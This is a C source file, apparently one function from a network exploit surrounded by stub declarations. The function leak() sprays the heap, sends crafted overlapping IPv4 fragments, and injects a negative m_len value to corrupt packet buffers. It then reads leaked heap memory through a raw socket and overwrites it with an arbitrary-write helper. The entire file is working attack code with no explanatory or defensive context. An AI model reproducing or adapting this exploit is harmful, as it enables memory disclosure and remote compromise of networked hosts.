
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int zero ;
typedef int u_int32_t ;
struct iphdr {size_t tot_len; size_t id; int frag_off; } ;
struct icmphdr {int dummy; } ;


 int DST_ADDR ;
 size_t ETH_HDRLEN ;
 int ETH_P_ALL ;
 size_t ICMP_HDRLEN ;
 size_t IP4_HDRLEN ;
 int IPPROTO_ICMP ;
 int IP_MAXPACKET ;
 int IP_MF ;
 char* Malloc (int ) ;
 int PF_PACKET ;
 int SOCK_RAW ;
 int SRC_ADDR ;
 int arbitrary_write (void*,int,char*,int,int) ;
 int die (char*) ;
 int ethernet_header (char*) ;
 void* heap_leak ;
 int htons (int ) ;
 int icmp_header (struct icmphdr*,int *,int) ;
 int inet_addr (int ) ;
 int ip_header (struct iphdr*,int,int,size_t,int ,size_t,int) ;
 int memcpy (char*,char*,int) ;
 int memset (char*,int,int ) ;
 size_t ntohs (size_t) ;
 int printf (char*) ;
 int rand () ;
 int recv_leaks () ;
 int recv_socket ;
 int send_ip4 (size_t,int,char*,int) ;
 int send_pkt (char*,int) ;
 int socket (int ,int ,int ) ;
 int spray (int,int) ;
 int spray_id ;

void leak() {
    u_int32_t src_addr, dst_addr;
    src_addr = inet_addr(SRC_ADDR);
    dst_addr = inet_addr(DST_ADDR);


    char * pkt = Malloc(IP_MAXPACKET);
    struct iphdr * ip = (struct iphdr * ) (pkt + ETH_HDRLEN);
    struct icmphdr * icmp = (struct icmphdr * )(pkt+ETH_HDRLEN+IP4_HDRLEN);
    ethernet_header(pkt);
    ip_header(ip,src_addr,dst_addr,ICMP_HDRLEN,IPPROTO_ICMP,0xbabe,IP_MF);

    ip->tot_len = ntohs(ip->tot_len) - IP4_HDRLEN;
    ip->id = ntohs(ip->id);
    ip->frag_off = htons(ip->frag_off);

    icmp_header(icmp,((void*)0),0x0);
    char * data = (char *)icmp + ICMP_HDRLEN + 8;
    size_t pkt_len = ETH_HDRLEN + IP4_HDRLEN + ICMP_HDRLEN;

    spray_id = rand() & 0xffff;
    arbitrary_write((void * )(0xb00-0x20),3,pkt,pkt_len+4,0x100);


    spray_id = rand() & 0xffff;
    spray(0x8, 0x20);
    size_t id = spray_id + 0x20;

    size_t replay_id = id++;
    send_ip4(replay_id, 0x100, ((void*)0), IP_MF);


    size_t target_id = id++;
    send_ip4(target_id, 0x8, ((void*)0), IP_MF);



    send_ip4(id++, 0x8, ((void*)0), IP_MF);
    send_ip4(id++, 0x8, ((void*)0), IP_MF);


    size_t hole_1 = id++;
    send_ip4(hole_1, 0x8, ((void*)0), IP_MF);



    send_ip4(id++, 0xC30, ((void*)0), IP_MF);


    size_t hole_2 = id++;
    send_ip4(hole_2, 0x8, ((void*)0), IP_MF);


    send_ip4(id++, 0x8, ((void*)0), IP_MF);


    send_ip4(hole_1, 0x8, ((void*)0), 0x1);


    send_ip4(hole_2, 0x8, ((void*)0), 0x1);


    int m_data_off = -0xd50;
    int m_len = m_data_off;
    size_t * addr = (size_t * )(0xb00 - 0x20 + ETH_HDRLEN + 0xe + 6) ;
    size_t addrlen = 0x3;

    if (addrlen != 0x8) {
      m_len -= (0x8 - addrlen);
    }

    size_t vuln_id = id++;

    memset(pkt,0x0,IP_MAXPACKET);
    ip = (struct iphdr * ) (pkt + ETH_HDRLEN);
    ethernet_header(pkt);

    pkt_len = 0xc90;
    ip_header(ip,m_len,0x0,pkt_len,IPPROTO_ICMP,vuln_id,IP_MF);
    u_int32_t frame_length = ETH_HDRLEN + IP4_HDRLEN + pkt_len;
    send_pkt(pkt,frame_length);


    memset(pkt,0x0,IP_MAXPACKET);
    ip = (struct iphdr * ) (pkt + ETH_HDRLEN);
    ethernet_header(pkt);
    pkt_len = 0x8;
    ip_header(ip,m_len,0x0,pkt_len,IPPROTO_ICMP,vuln_id,0x192);
    frame_length = ETH_HDRLEN + IP4_HDRLEN + pkt_len;
    send_pkt(pkt,frame_length);



    char addr_buf[0x8] = {0};
    if (addrlen != 0x8) {
      memcpy(&addr_buf[(0x8-addrlen)],(char *)&addr,addrlen);
    } else {
      memcpy(addr_buf,(char *)&addr,8);
    }
    send_ip4(target_id, 0x8, addr_buf, 0x1);

  if ((recv_socket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
      die("socket() failed to obtain a receive socket descriptor");
    send_ip4(replay_id, 0x8, ((void*)0), 0x20);
    recv_leaks();


    char zero[0x28] = {0};
    spray_id = rand() & 0xffff;
    printf("Cleaning Heap\n");
    arbitrary_write(heap_leak + (0xb00 - 0x20),3,zero,sizeof(zero),0x20);
}
